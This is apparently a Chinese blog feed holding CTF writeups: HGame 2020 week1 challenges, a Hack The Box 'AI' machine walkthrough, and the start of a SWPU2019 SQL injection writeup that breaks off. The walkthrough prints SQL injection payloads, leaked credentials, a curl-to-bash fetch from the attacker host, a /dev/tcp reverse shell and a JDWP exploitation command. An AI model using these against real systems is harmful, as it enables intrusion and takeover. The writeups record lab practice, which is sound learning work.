        <content type="html"><![CDATA[<p>   萌新的第一次hgame开始了。week1的难度比较友好，至少从web上来说是这样的，自己目标也不高，争取做到每个week能akweb就满足了。这次的web整体上比较简单，除了我自己被坑到的codeworld（中间居然被ban了ip,我只是用脚本post了一次 ，没拿扫描器扫啊啊啊）剩下的3题加起来基本1小时以内就能做完hh。除此之外还试了试密码学跟misc的简单题，也都写一写过程吧。（另外体会到re,pwn真的是爸爸，爷爷，排名高的基本都是二进制的……,我什么时候才能学会二进制啊）</p><p>看到官方发布了才发的，那就贴下官方的：<a href="https://github.com/vidar-team/Hgame2020_writeup" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup</a></p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h2><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/1.jpg" alt="git"><br>显然提示的是源码泄露。那么就果断GitHack走起。可是拿下来的结果只有index.html与css文件。这时候一开始我陷入了错误的想法，具体参考原来ichunqiu上做过的‘登陆’一题。于是我使用了能够回滚的githack，在它爬下的objects里一个个找（具体方法如下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git  cat-file -p &#x2F;两位数&#x2F;文件名</span><br></pre></td></tr></table></figure><p>查看完所有objects也没有什么收获，除了出题人的github……那么是否是历史回滚呢？但用git找却只找到一个版本，感觉不太对劲。那就上github上找找吧……结果还真有。<img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/2.jpg" alt="commit"><br>下面的版本中就有flag的base64编码</p><h2 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h2><p>题目上来没啥提示，除了一张接头霸王的图片跟you need to come from vidar.club<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/3.jpg" alt="头"></p><p>要说web里跟头有关的，那只能是抓包里常见的Header了。加上come from 某个网址，不难知道就是http Header中referer这个属性。这个属性之所以有名，跟它将错就错的拼写有关，正确拼写显然是referrer,而这个错误拼写是早期规范的错误因为向后兼容遗留至今的。其作用是告诉服务器我们访问者是从哪链接过来的，从而进行区别处理。<br>那么先加referer头<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/4.jpg" alt="referer"></p><p>提示要从本地访问，那就更熟悉不过了，因为这用到已经烂熟于心的XFF头了。常常用于伪造ip。所以我们令XFF头为127.0.0.1.<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/5.jpg" alt="xff"><br>提示改浏览器，那只需改User-Agent 头，加上cosmos即可。<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/6.jpg" alt="user-agent"><br>flag要在2077后更新？一看到2077我就想到去年新手上场的中科大hackergame里的信息安全2077，那道题就是通过改header中一个属性来拿flag。这道题应该也一样吧……那么我们要改什么属性呢？先来看看response:<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/7.jpg" alt="Last-Modified"><br>注意到有Last-Moified这一属性，而requests的请求头中与之对应的就是If-Unmodifed-Since,其官方解释</p><blockquote><p>HTTP协议中的 <strong><code>If-Unmodified-Since</code></strong> 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener" title="HTTP POST 方法 发送数据给服务器. 请求主体的类型由 Content-Type 首部指定."><code>POST</code></a> 或其他 non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener" title="safe: An HTTP method is safe if it doesn&#39;t alter the state of the server. In other words, a method is safe if it leads to a read-only operation. Several common HTTP methods are safe: GET, HEAD, or OPTIONS. All safe methods are also idempotent, but not all idempotent methods are safe. For example, PUT and DELETE are both idempotent but unsafe.">safe</a> 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412" target="_blank" rel="noopener" title="在 HTTP 协议中，响应状态码 412 Precondition Failed（先决条件失败）表示客户端错误，意味着对于目标资源的访问请求被拒绝。这通常发生于采用除 GET 和 HEAD 之外的方法进行条件请求时，由首部字段 If-Unmodified-Since 或 If-None-Match 规定的先决条件不成立的情况下。这时候，请求的操作——通常是上传或修改文件——无法执行，从而返回该错误状态码。"><code>412</code></a> (Precondition Failed) 错误。</p></blockquote><p>所以改好时间在2077之后：<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/8.jpg" alt="If-Unmodified-Since"></p><h2 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h2><p>  这道题做出来的人数算是所有web里面最少的了,但是自己一开始傻傻的卡了好久……<br>  开始一个403,不过作为ctfer,千万不要相信这个403是真正的403，那么先抓个包，果不其然<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/9.jpg" alt="302"><br>提示存在302，那么直接访问index.php吧，抓包后发至repeater发现存在405,那么果断改成POST请求方式，得到：<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/10.jpg" alt="人机验证"></p><p>那么提示通过url传值，那果断传<code>/?a=5+5</code>啊，结果返回说“再想想”。自己顿时陷入迷茫，一开始想是不是不是用+连接，后来又想，基于题目是codeworld，是不是要代码执行?但是fuzz了一下，发现并没有回显执行的点。于是陷入迷茫。后来，自己在检查自己抓的包时，意外发现了一点：<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/11.jpg" alt="get传值"><br>对了！在进行get传值时，他会把加号处理成空。也正因如此，题目才会要求url传值并使用相加这种方式来设置限定。所以payload即为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?a&#x3D;5%2B5</span><br></pre></td></tr></table></figure><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/12.jpg" alt="flag"></p><h2 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h2><p>游戏题hhh但从游戏角度过分难了。显然游戏只是幌子，应该找到网站里能post值的操作，于是尝试狂点‘开始游戏’，果然提示需要300000分时抓到post包。改包就好。<br><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/13.jpg" alt></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h2><p>有生之年还能做出RSA……因为看到RSA几个参数提示的很清楚就干脆去网上嫖脚本了。在装库的时候就很无奈，gmpy2总是弄不好。最后去找了个whl，pip install下总归能用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = gmpy2.mpz(<span class="number">681782737450022065655472455411</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">675274897132088253519831953441</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">13</span>)</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">c = gmpy2.mpz(<span class="number">275698465082361070145173688411496311542172902608559859019841</span>)</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(<span class="string">"十进制:\n%s"</span>%m)</span><br><span class="line">m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line">print(<span class="string">"十六进制:\n%s"</span>%(m_hex,))</span><br><span class="line"><span class="comment">#print("ascII:\n%s"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))</span></span><br><span class="line">print(<span class="string">"ascii:\n%s"</span>%(binascii.a2b_hex(m_hex).decode(<span class="string">"utf8"</span>),))</span><br></pre></td></tr></table></figure><p><img src="/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/14.jpg" alt="RSA"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</span><br></pre></td></tr></table></figure><p>一开始不太清楚这是什么编码，后来百度一下发现就是base64。回头想想，发现毕竟是数字+字母的组合，可以考虑base系的编码。<br>解码后为morse电码，在线解一下就好了。</p><h2 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h2><p>题目下下来打开是个图片，扔winhex里看发现末尾提示flag.txt以及密码是图片id，图片名则标注了pixiv。。。估计是要改成压缩包了，所以也没去看有没有压缩包文件，头就直接改zip，果不其然是压缩包，内容为flag.txt，需要密码。那就直接上p站找这个画师吧（感觉吃了一波强行安利啊）找到图片后用密码看flag.txt，最后结果ascii解码一下就好。</p><h2 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h2><p>一时兴起还是看了看这道misc。上来先给了一个压缩包一个文件，文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fenses first, Five Caesar next. English sentense first,  zip password next.</span><br></pre></td></tr></table></figure><p>看到fences跟ceaser就想到了栅栏跟凯撒密码了。加上提示先3栅栏，再5凯撒，那么在线解下码，对应组数与偏移数分别为3,5即可。解出来前面一句话如下：<br>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.<br>出自百年孤独，不知道有什么用。解出的密码用来解压加密的压缩包，得到文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:text;ook,</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.............</span><br></pre></td></tr></table></figure><p>有点摸不着头脑，于是谷歌一下，发现这是属于brainfuck编码中的一种，不禁让我联想到了原来伤眼睛的jsfuck编码……那么在线解码一下（找个好点的网站，开始我找的网站只解了一部分），得到base32编码。再base32解码，发现得到的结果可以进行base64解码，且结果开头有图片的文件头。那么可以确认是图片文件内容进行了base64编码。那直接解出文件就好了（可以用python，也可以在线）。得到二维码，直接扫码得flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-AI——有趣的sql+JDWPgetshell</title>
      <link href="2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/"/>
      <url>2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/</url>
      
        <content type="html"><![CDATA[<p>终于又等到hackthebox更新退役靶机了，这次的靶机是AI。因为比较有意思所以来记录下。不过过程并非一帆风顺。其中还遇到靶机磁盘写满导致无法写入文件的事。删了半天才想起来要重设靶机……</p><p>跟上次一样参考了下大神的视频<a href="https://www.youtube.com/watch?v=7n7YRntu3bc&t=1391s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s</a>视频真的非常良心。</p><a id="more"></a><p>(这次做之前更新kali虚拟机,又把自己的虚拟机弄死机了……好在现在不那么容易整体炸掉，倒是kali的界面越更新越舒适，挺不错的)<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a12.PNG" alt="AI"></p><p><strong>本机ip:10.10.15.60</strong></p><p><strong>靶机ip:10.10.10.163</strong></p><p>首先第一步当然是探测端口了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA ai 10.10.10.163</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a1.PNG" alt="nmap"></p><p>发现有22与80端口开放。既然有http服务，那就尝试直接访问吧。<br>有一个主页面。同时也发现了其他php文件，唯一比较有意思的就是下面这个<code>ai.php</code>页面，有一个文件上传点。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a2.PNG" alt="ai"></p><p>但是很奇怪。居然是<code>.wav</code>file。通常我所知道的文件上传点也就图片马或者phar反序列化或者其他类型的getshell。而它提示的drop your query using wav file.似乎是在说明我们可以进行查询操作。</p><p>那么首先随便传一个test.php上去。内容随意。发现没有回显。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a3.PNG" alt="test"></p><p>看来是要<code>wav</code>的音频文件了。使用音频文件执行查询，这点真的难以弄懂。那么在尝试弄清漏洞类型之前先来目录爆破一下，看有没有什么别的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.163 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php</span><br></pre></td></tr></table></figure><p>基于这里都是php，我们在gobuster后着重加上<code>-x php</code>进行筛选。<br>解果大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;contact.php (Status: 200)</span><br><span class="line">&#x2F;about.php (Status: 200)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x2F;db.php (Status:301)</span><br><span class="line">&#x2F;intelligence.php(Status: 200)</span><br><span class="line">&#x2F;ai.php(Status: 200)</span><br></pre></td></tr></table></figure><p>其中ai.php等等都是主页面就提供了的。新发现的页面包括<code>intelligence.php</code>跟<code>db.php</code>。上传跟图片界面我们都没有权限进去。那么访问下唯一可以访问的<code>intelligence.php</code><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a4.PNG" alt="intelligence.php"></p><p>发现了这个页面。似乎存在着词语的替换关系。从表的右列中我们不难找到一些熟悉的符号–<code>union</code>,<code>#</code>,<code>---</code>,<code>Schema</code>等等。这些都是常常出现在<strong>sql注入</strong>中的符号。结合我们还爆破出了db.php，可以猜想是否有sql注入的漏洞呢？</p><p>答案是正确的。而且脑洞大开的是：我们要用语言转成音频文件上传来进行注入。这也许就是这个AI靶机的名字所在吧。</p><p>首先google linux say command， 发现有这样的一个软件。叫做festival。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install festival</span><br></pre></td></tr></table></figure><p>使用它其中一个叫text2wave的就能将语句转成语音文件。比如用下管道符，生成一个test.wav，内容为hello。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot;| text2wave -o test.wav</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a5.PNG" alt="test"></p><p>尝试听下这个音频，发现是个男低音（也许是机器合成音?）然后再次尝试上传<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a6.PNG" alt="hello"><br>发现input有结果，那么就尝试下翻译成英文来sql注入吧。<br>(这点对非英语母语的国家的人应该非常不友好……毕竟有些偏门的括号之类的英文我也不太熟）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( openparenthesis 左括号</span><br><span class="line">) closeparenthesis 右括号</span><br><span class="line">- hyphen   连字符</span><br></pre></td></tr></table></figure><p>基于一开始还探测到的<code>intelligence.php</code>中有些字符对应关系，不难想到我们需要使用那张表来绕过注入<br>比如我的尝试payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select database()---</span><br></pre></td></tr></table></figure><p>需要换作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open single quote, join select , database open parenthesis close parenthesis comment database</span><br></pre></td></tr></table></figure><p>再重复上面生成test.wav的操作，就可以上传注入。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a7.PNG" alt="database"></p><p>基于hackthebox易得user的尿性，可以猜出一张users表然后爆出username跟password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select username from user---</span><br><span class="line">open single quote, join , select , username from users comment database</span><br><span class="line">open single quote, join , select , password from users comment database</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a8.PNG" alt="username"><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a9.PNG" alt="password"></p><p>显然，我们的http页面并没有什么让我们登录进去的方法或页面。基于之前的端口探测发现有ssh开放，不妨尝试ssh登录<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a10.PNG" alt="ssh login"><br>成功登陆。并且user.txt就在当前目录下。</p><p>之后就是常规提权的过程了。</p><p>这里开始可能会想到之前没成功访问的db.php，在<code>/var/www/html</code>中爆出内容<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a11.PNG" alt="mysql"><br>可知username为<code>dbuser</code>,password为<code>toor</code><br>进入mysql可用的就多了。（然而我进去的时候库被别人删了……）实际上可以爆出之前alexa所在user表的内容中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:H,Sq9t6&#125;a&lt;)?q931</span><br></pre></td></tr></table></figure><p>但是ssh登录并不成功。mysql这条路走不通。</p><p>众所周知，发现提权的漏洞点并不是一件容易的事，尤其是对我这样的小白而言。所以，我从dalao视频那发现了一个很厉害的脚本可以解决我自己的漏洞认知问题。<br><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a><br>在靶机上使用其中的<code>linpeas.sh</code>，脚本就会自动分析可能提权的漏洞点。着实解决不少问题。不过通常结果又臭又长，可能需要耐心找一找。<br>具体方法也很简单，本机git clone好后，起一个python监听（默认8000端口）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p>在靶机上直接curl后执行就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.15.60:8000&#x2F;linpeas.sh | bash</span><br></pre></td></tr></table></figure><p>这里从linpeas.sh的结果中可以发现一个JDWP的点被标红了。<br>那么jdwp是什么呢？我们搜索一下</p><blockquote><p>JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息</p></blockquote><p>而这是有漏洞利用的。比如知道创宇上的<br><a href="https://www.seebug.org/vuldb/ssvid-89216" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89216</a></p><p>等等，都是jdwp的代码执行漏洞。那么我们接下来就用这个漏洞，尝试拿到root权限。<br>首先确定使用的工具<br><a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p><figure class="highlight plain"><figcaption><span>shell比较好。所以先在alexa的靶机的tmp目录下放一个反弹shell的脚本test.sh内容如下：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.60&#x2F;9002 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure><p>然后给其执行的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x test.sh</span><br></pre></td></tr></table></figure><p>调用时只需：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;test.sh</span><br></pre></td></tr></table></figure><p>先本机监听下，没有问题，可以弹到alexa的shell。</p><p>接下来用到一个新学到的大招：端口转发。我们都知道，每次ssh登录这一靶机都要用户密码，十分麻烦。而且将要利用的jdwp是java的debug功能，据说操作时十分容易断开。那有没有什么方法可以本机处理这个jdwp呢？答案就是端口转发。原本自己以为十分复杂，但实际上并非如此。</p><p>首先在靶机上确认jdwp是运行在8000端口的。<br>那么我先进入tomcat的目录，按下<code>~C</code>将直接进入ssh，然后将其转到localhost来研究</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-L 8000:localhost:8000</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a13.PNG" alt="8000端口"></p><p>这时我们在本机上使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -lntp</span><br></pre></td></tr></table></figure><p>查看主机监听的端口。就会发现8000端口处于监听状态了，user是ssh。我们也可以用同样的方法转发tomcat的8009和8080端口到本地，这样我们就能直接浏览器访问<code>localhost:8080</code>来分析tomcat（当然这里没有什么帮助）</p><p>当然，这里转发到本地本来只是方便调试，因为可以直接在本地手动利用jdwp的漏洞，找到一个breakpoint用debug功能来执行命令。但是这方面实在不熟（java白学了），所以还是直接利用上面的脚本舒服啊。<br>shellifier用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd &quot;Your Command&quot;</span><br></pre></td></tr></table></figure><p>这里我们直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&#x2F;tmp&#x2F;test.sh&quot;</span><br></pre></td></tr></table></figure><p>因为转发了ip，端口所以使用的ip是本地。而break-on这点方便找出可以利用的断点。最后的cmd执行我们的反弹shell。<br>本机再度监听后执行这个脚本<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a14.PNG" alt="root"><br>成功反弹shell到本机。即可拿到root.txt</p><p>感觉提权这方面自己还是不太熟悉，可能因为大部分ctf比赛注重的也只是getshell层面上的吧，之后的操作还要多加了解知识学习啊。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从SWPU2019-WEB1&amp;WEB4学sql注入</title>
      <link href="2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/"/>
      <url>2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>本来打算这几天重新从头开始学下sql注入的，毕竟hgameweek1的wp都已经写好了，题能做的都做了。但是猛然想起今年在混了下GXYCTF前还实打实的打了GWCTF跟SWPUCTF。当时GW的题做了两道web，一道php随机数漏洞一道phpmyadmin getshell，没什么含金量就没写。而且事后看其他选手就只有一个人web做了三道，其余基本都是1,2道就觉得没什么复现其他题的必要；swpu就完全相反了，web题难度对我而言有些高了，而且还有坑在里面。当时就做了三道隐写题（记得每道隐写都是zip型题目），之后没条件后也没时间复现。所以在此再次感谢buuoj给了我复现题目的机会……</p><a id="more"></a><p>有一说一，swpu题目难归难，官方wp还是很详细的。</p><h1 id="web1-sql注入（union-or-二次注入-）"><a href="#web1-sql注入（union-or-二次注入-）" class="headerlink" title="web1(sql注入（union or 二次注入 ）)"></a>web1(sql注入（union or 二次注入 ）)</h1><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/1.jpg" alt="sql注入"></p><p>这道题目的点在于sql注入。开始的登陆框知识幌子，注册账号登陆进去后就会发现有一个广告申请的这一操作。通常看到这种形式，基本确定是sql注入或者是xss。FUZZ一下后，可以确认是sql。<br>尝试简单的注入语句，发现空格被过滤了，用<code>/**/</code>绕过成功。<br>当时还FUZZ出来了报错注入的关键函数，以及常见的注释符号，关键字or也被过滤了。<br>因此，按照自己的第一想法，可以尝试使用最普遍的union联合查询，只是这样会面临几个问题：</p><p>1.注释被过滤带来的闭合问题<br>2.面对强过滤的or,后面进行注入爆出表名及列名的常规语句：<code>union select group_concat(table_name) from information_schema.tables where table_schema=database()</code>将存在information中的or被过滤的境地</p><p>事实上，对于第一点的闭合问题，自己在网上找到了相关bypass技巧。确切说不算技巧，应该是在sql注入中对应当先做的第一步‘复原sql查询语句’后所进行的常规判断。<br>由于FUZZ，时，我们在输入<code>-1&#39;</code>时得到报错结果，那复原出来的语句应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ads where title &#x3D; &#39;$title&#39; limit 0,1;</span><br></pre></td></tr></table></figure><p>因此面对第一个问题，不使用过滤号，使用<code>&#39;</code>（单引号）闭合单引号是水到渠成的。<br>那么现在就要开始fuzz字段数了……首先，发现<code>order by</code>的or也被过滤了,转而使用<code>group by</code>。好的，这道题当时最为人诟病的地方来了，那就是它居然有22个字段数！我想人手工使用语句fuzz发现这么多字段数应该是早就怀疑人生了吧？当时估计很多人都倒在这题的字段数上。<br>FUZZ字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1</span><br></pre></td></tr></table></figure><p>成功后接下来union select吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 